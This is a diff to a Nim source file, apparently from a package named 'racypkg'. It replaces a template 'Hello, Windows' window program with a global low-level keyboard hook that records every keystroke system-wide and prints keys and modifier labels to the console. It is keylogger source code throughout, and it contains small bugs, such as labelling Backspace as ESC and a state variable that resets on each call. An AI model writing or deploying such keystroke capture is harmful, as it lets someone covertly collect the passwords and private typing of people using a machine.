@@ -1,59 +1,48 @@
-# This is just an example to get you started. Users of your hybrid library will
-# import this file by writing ``import racypkg/submodule``. Feel free to rename or
-# remove this file altogether. You may create additional modules alongside
-# this file as required.
+import winim
 
-import winim/lean
+proc keyboardHook(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.}=
+  var last: int32
+  var letter: bool = true
+  if nCode == HC_ACTION:
+    if wParam == WM_KEYDOWN or wParam == WM_SYSKEYDOWN:
+      var p: PKBDLLHOOKSTRUCT = cast[PKBDLLHOOKSTRUCT](lParam)
+      let code = p.vkCode
+      if code == 0xA2: # LCTRL or first signal of RALT
+        last = code
+        return CallNextHookEx(cast[HHOOK](NULL), nCode,wParam, lParam)
+      if last == 0xA2 and code == 0xA5: # RALT
+        echo "<RALT>"
+        letter = false
+      elif last == 0xA2 and code != 0xA5:
+        echo "<LCTRL>"
+      if code == 0xA3:
+        letter = false
+        echo "<RCTRL>"
+      if code == 0xA4:
+        letter = false
+        echo "<LALT>"
+      if code == 0xA0:
+        letter = false
+        echo "<LSHIFT>"
+      if code == 0xA1:
+        letter = false
+        echo "<RSHIFT>"
+      if code == 0x08:
+        letter = false
+        echo "<ESC>"
+      if code == 0x0D:
+        letter = false
+        echo "\n"
+      last = code
+      if letter:
+        echo ($char(code))
 
-proc WindowProc(hwnd: HWND, message: UINT, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} =
-  case message
-  of WM_PAINT:
-    var ps: PAINTSTRUCT
-    var hdc = BeginPaint(hwnd, ps)
-    defer: EndPaint(hwnd, ps)
-
-    var rect: RECT
-    GetClientRect(hwnd, rect)
-    DrawText(hdc, "Hello, Windows!", -1, rect, DT_SINGLELINE or DT_CENTER or DT_VCENTER)
-    return 0
-
-  of WM_DESTROY:
-    PostQuitMessage(0)
-    return 0
-
-  else:
-    return DefWindowProc(hwnd, message, wParam, lParam)
 
 proc main*() =
-  var
-    hInstance = GetModuleHandle(nil)
-    appName = "HelloWin"
-    hwnd: HWND
-    msg: MSG
-    wndclass: WNDCLASS
-
-  wndclass.style = CS_HREDRAW or CS_VREDRAW
-  wndclass.lpfnWndProc = WindowProc
-  wndclass.cbClsExtra = 0
-  wndclass.cbWndExtra = 0
-  wndclass.hInstance = hInstance
-  wndclass.hIcon = LoadIcon(0, IDI_APPLICATION)
-  wndclass.hCursor = LoadCursor(0, IDC_ARROW)
-  wndclass.hbrBackground = GetStockObject(WHITE_BRUSH)
-  wndclass.lpszMenuName = nil
-  wndclass.lpszClassName = appName
-
-  if RegisterClass(wndclass) == 0:
-    MessageBox(0, "This program requires Windows NT!", appName, MB_ICONERROR)
-    return
-
-  hwnd = CreateWindow(appName, "The Hello Program", WS_OVERLAPPEDWINDOW,
-    CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
-    0, 0, hInstance, nil)
-
-  ShowWindow(hwnd, SW_SHOW)
-  UpdateWindow(hwnd)
-
+  var hInstance = GetModuleHandle(nil)
+  var hook = SetWindowsHookEx(WH_KEYBOARD_LL.int32, keyboardHook, hInstance, 0)
+  var msg: MSG
   while GetMessage(msg, 0, 0, 0) != 0:
-    TranslateMessage(msg)
-    DispatchMessage(msg)
+    TranslateMessage(&msg)
+    DispatchMessage(&msg)
+  UnhookWindowsHookEx(hook)
